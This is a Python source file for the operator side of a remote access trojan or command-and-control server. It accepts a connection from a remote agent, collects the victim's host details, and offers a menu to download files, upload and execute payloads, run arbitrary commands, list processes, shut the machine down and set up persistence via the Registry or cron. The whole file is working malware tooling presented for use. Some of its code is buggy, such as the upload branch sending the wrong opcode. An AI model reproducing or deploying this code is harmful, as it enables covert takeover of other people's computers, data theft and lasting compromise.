# TODO Implement AES encryption
# TODO Refactor to use ArgParse
# TODO Refactor to use commands instead of just a menu
import os
import sys
import socket
import tqdm

BUFF_SIZE = 1024
choice = 1
ip = sys.argv[1]
port = sys.argv[2]

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    print("Starting server on IP: " + ip + " Port: " + port)
    s.bind((ip, int(port)))
    s.listen()

    handler, addr = s.accept()

    print("Connection received from remote IP: " + addr[0])

    hostname = handler.recv(BUFF_SIZE).decode()
    mac = handler.recv(BUFF_SIZE).decode()
    family= handler.recv(BUFF_SIZE).decode()
    release = handler.recv(BUFF_SIZE).decode()
    process = handler.recv(BUFF_SIZE).decode()
    pid = handler.recv(BUFF_SIZE).decode()
    user = handler.recv(BUFF_SIZE).decode()
    cwd = handler.recv(BUFF_SIZE).decode()

    opsys = family + ' ' + release

    print("Remote machine Hostname: " + hostname)
    print("Remote machine IP: " + addr[0])
    print("Remote machine MAC address: " + mac)
    print("Remote machine OS: " + opsys)
    print("Running as Process: " + process)
    print("With PID: " + pid)
    print("Under user: " + user)
    print("In CWD: " + cwd)

    while choice != 0:
        print("*" * 40)
        print("Select command to execute on remote machine:")
        print("\'1\' to shutdown remote machine.")
        print("\'2\' to kill remote agent.")
        print("\'3\' to retrieve host information (Hostname/IP/PID/OS/etc.).")
        print("\'4\' to download file from remote machine.")
        print("\'5\' to retrieve a process list from the remote machine.")
        print("\'6\' to upload and execute file on remote machine.")
        print("\'7\' to run a command on the remote machine.")
        print("\'8\' to enable persistence")
        print("\'0\' to quit.")
        choice = int(input("Command: "))

        if choice == 1:
            print("Shutting down remote machine.")
            handler.send('1'.encode())

        elif choice == 2:
            print("Killing remote agent.")
            handler.send('2'.encode())

        elif choice == 3:
            handler.send('3'.encode())
            mac = handler.recv(BUFF_SIZE).decode()
            process = handler.recv(BUFF_SIZE).decode()
            pid = handler.recv(BUFF_SIZE).decode()
            user = handler.recv(BUFF_SIZE).decode()
            cwd = handler.recv(BUFF_SIZE).decode()
            print("Remote machine Hostname: " + hostname)
            print("Remote machine IP: " + addr[0])
            print("Remote machine MAC address: " + mac)
            print("Remote machine OS: " + opsys)
            print("Running as Process: " + process)
            print("With PID: " + pid)
            print("Under user: " + user)
            print("In CWD: " + cwd)

        elif choice == 4:
            handler.send('4'.encode())
            filepath = input("Enter remote filepath: ")
            handler.send(filepath.encode())
            filename = os.path.basename(filepath)
            filesize = handler.recv(BUFF_SIZE).decode()
            print("Remote filesize: " + filesize + " Bytes.")
            print("Saving remote file as: " + filename)
            progBar = tqdm.tqdm(range(int(filesize)), f"Retrieving file: {filename} from remote machine", unit="B",
                                unit_scale=True, unit_divisor=1024)
            with open(filename, "wb") as f:
                for _ in progBar:
                    readBytes = handler.recv(BUFF_SIZE)
                    if not readBytes:  # done
                        break
                    f.write(readBytes)
                    progBar.update(len(readBytes))
            print("File retrieved.")

        elif choice == 5:  # Retrieve Process List
            handler.send('5'.encode())
            print("Remote Process List: [PID] [STATUS] [USER] [NAME]")

            numProcs = int(handler.recv(BUFF_SIZE).decode())

            proc = ''

            while proc != 'done':   # Not technically needed but useful in case something ets lost,
                                    # tells server we're done.
                proc = handler.recv(BUFF_SIZE).decode()
                if proc != 'done':
                    print(proc)

        elif choice == 6:  # upload and execute file on client
            handler.send('5'.encode())
            filepath = input("Enter local filepath to upload: ")
            trgtpath = input("Enter filepath to save file as on target: ")
            handler.send(trgtpath.encode())
            size = os.path.getsize(filepath)
            s.send(str(size).encode())

            progBar = tqdm.tqdm(range(size), f"Sending file: {filepath} to remote machine", unit="B", unit_scale=True,
                                unit_divisor=1024)
            with open(filepath, "rb") as f:
                for _ in progBar:
                    readBytes = f.read(BUFF_SIZE)
                    if not readBytes:  # done
                        break
                    s.send(readBytes)
                    progBar.update(len(readBytes))
            print("File sent to client for execution.")

        elif choice == 7:  # run system command on target, echoes command back before printing results
            handler.send('6'.encode())
            cmd = input("Command to run on target: ")
            handler.send(cmd.encode())

            results = handler.recv(BUFF_SIZE).decode()
            print(cmd + '\n' + results)

        # elif choice == 8:  # Migrate to a new process ** PLACEHOLDER ** TODO IMPLEMENT THIS
        #    if family != 'Windows':
        #        print("Error: Process Migration currently only available for Windows OS, current system is: " + family)
        #
        #   else:
        #       handler.send('8'.encode())
        #
        #       pid = input("Enter PID of process to migrate to: ")
        #       handler.send(pid.encode())'''

        elif choice == 8:  # Persistence
            handler.send('8'.encode())
            print("Attempting to enable persistence via Registry (Windows) or Cron (*nix)...")
            status = handler.recv(BUFF_SIZE).decode()
            print(status)

        elif choice == 0:
            print("Exiting. Have a nice day.")
            handler.send('0'.encode())
            sys.exit()

        else:
            print("Invalid command.")
